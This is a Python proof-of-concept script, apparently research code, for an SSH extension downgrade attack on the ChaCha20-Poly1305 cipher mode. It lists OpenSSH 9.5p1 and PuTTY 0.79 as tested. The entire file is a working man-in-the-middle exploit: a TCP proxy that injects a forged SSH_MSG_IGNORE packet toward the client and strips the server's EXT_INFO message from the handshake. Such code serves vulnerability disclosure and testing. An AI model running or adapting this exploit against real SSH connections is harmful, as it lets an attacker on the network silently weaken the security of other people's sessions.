#!/usr/bin/python3
import socket
from binascii import unhexlify
from threading import Thread
from time import sleep

#####################################################################################
## Proof of Concept for the extension downgrade attack                             ##
##                                                                                 ##
## Variant: ChaCha20-Poly1305                                                      ##
##                                                                                 ##
## Client(s) tested: OpenSSH 9.5p1 / PuTTY 0.79                                    ##
## Server(s) tested: OpenSSH 9.5p1                                                 ##
##                                                                                 ##
## Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0    ##
#####################################################################################

# IP and port for the TCP proxy to bind to
PROXY_IP = '127.0.0.1'
PROXY_PORT = 2222

# IP and port of the server
SERVER_IP = '127.0.0.1'
SERVER_PORT = 22

LENGTH_FIELD_LENGTH = 4

def pipe_socket_stream(in_socket, out_socket):
    try:
        while True:
            data = in_socket.recv(4096)
            if len(data) == 0:
                break
            out_socket.send(data)
    except ConnectionResetError:
        print("[!] Socket connection has been reset. Closing sockets.")
    except OSError:
        print("[!] Sockets closed by another thread. Terminating pipe_socket_stream thread.")
    in_socket.close()
    out_socket.close()

rogue_msg_ignore = unhexlify('0000000C060200000000000000000000')
def perform_attack(client_socket, server_socket):
    # Version exchange
    client_vex = client_socket.recv(255)
    server_vex = server_socket.recv(255)
    client_socket.send(server_vex)
    server_socket.send(client_vex)
    # SSH_MSG_KEXINIT
    client_kexinit = client_socket.recv(35000)
    server_kexinit = server_socket.recv(35000)
    client_socket.send(server_kexinit)
    server_socket.send(client_kexinit)
    # Client will now send the key exchange INIT
    client_kex_init = client_socket.recv(35000)
    server_socket.send(client_kex_init)
    # Insert ignore message (to client)
    client_socket.send(rogue_msg_ignore)
    # Wait half a second here to avoid missing EXT_INFO
    # Can be solved by counting bytes as well
    sleep(0.5)
    # KEX_REPLY / NEW_KEYS / EXT_INFO
    server_response = server_socket.recv(35000)
    # Strip EXT_INFO before forwarding server_response to client
    # Length fields of KEX_REPLY and NEW_KEYS are still unencrypted
    server_kex_reply_length = LENGTH_FIELD_LENGTH + int.from_bytes(server_response[:LENGTH_FIELD_LENGTH], byteorder='big')
    server_newkeys_start = server_kex_reply_length
    server_newkeys_length = LENGTH_FIELD_LENGTH + int.from_bytes(server_response[server_newkeys_start:server_newkeys_start + LENGTH_FIELD_LENGTH], byteorder='big')
    server_extinfo_start = server_newkeys_start + server_newkeys_length
    client_socket.send(server_response[:server_extinfo_start])

if __name__ == '__main__':
    print("--- Proof of Concept for extension downgrade attack (ChaCha20-Poly1305) ---")
    mitm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mitm_socket.bind((PROXY_IP, PROXY_PORT))
    mitm_socket.listen(5)

    print(f"[+] MitM Proxy started. Listening on {(PROXY_IP, PROXY_PORT)} for incoming connections...")
    try:
        while True:
            client_socket, client_addr = mitm_socket.accept()
            print(f"[+] Accepted connection from: {client_addr}")
            print(f"[+] Establishing new target connection to {(SERVER_IP, SERVER_PORT)}.")
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.connect((SERVER_IP, SERVER_PORT))
            print("[+] Performing extension downgrade")
            perform_attack(client_socket, server_socket)
            print("[+] Downgrade performed. Spawning new forwarding threads to handle client connection from now on.")
            forward_client_to_server_thread = Thread(target=pipe_socket_stream, args=(client_socket, server_socket), daemon=True)
            forward_client_to_server_thread.start()
            forward_server_to_client_thread = Thread(target=pipe_socket_stream, args=(server_socket, client_socket), daemon=True)
            forward_server_to_client_thread.start()
    except KeyboardInterrupt:
        client_socket.close()
        server_socket.close()
        mitm_socket.close()
